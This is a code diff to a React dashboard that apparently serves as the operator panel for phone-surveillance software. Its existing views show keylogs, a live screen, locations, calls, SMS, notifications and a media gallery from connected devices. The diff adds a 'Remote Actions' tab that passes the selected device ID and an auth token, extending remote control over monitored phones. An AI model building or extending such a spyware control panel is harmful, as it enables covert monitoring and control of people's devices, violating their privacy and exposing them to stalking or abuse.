@@ -14,6 +14,7 @@ import InstalledAppList from '../components/InstalledAppList';
 import KeylogList from '../components/KeylogList';
 import LiveScreenView from '../components/LiveScreenView';
 import GalleryView from '../components/GalleryView';
+import RemoteActions from '../components/RemoteActions';
 import { 
   PhoneCall, 
   MessageSquare, 
@@ -133,7 +134,7 @@ function DashboardPage() {
     locations: data.locations.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
     installedApps: data.installedApps.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
     notifications: data.notifications.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
-    keylogs: (data.keylogs || []).filter(item => !selectedDeviceId || item.device_id === selectedDeviceId)
+    keylogs: (data.keylogs || []).filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
   };
 
   const renderContent = () => {
@@ -271,7 +272,10 @@ function DashboardPage() {
         return <LiveScreenView selectedDevice={selectedDevice} />;
 
       case 'gallery':
-        return <GalleryView selectedDevice={selectedDevice} />;
+        return <GalleryView deviceId={selectedDeviceId} />;
+
+      case 'remote-actions':
+        return <RemoteActions deviceId={selectedDeviceId} token={token} fullView={true} />;
 
       default:
         return null;
@@ -282,6 +286,7 @@ function DashboardPage() {
     { id: 'devices', label: 'Connected Devices' },
     { id: 'live-view', label: 'Live View' },
     { id: 'gallery', label: 'Media Gallery' },
+    { id: 'remote-actions', label: 'Remote Actions' },
     { id: 'calls', label: 'Call History' },
     { id: 'sms', label: 'Messages' },
     { id: 'notifications', label: 'Notifications' },
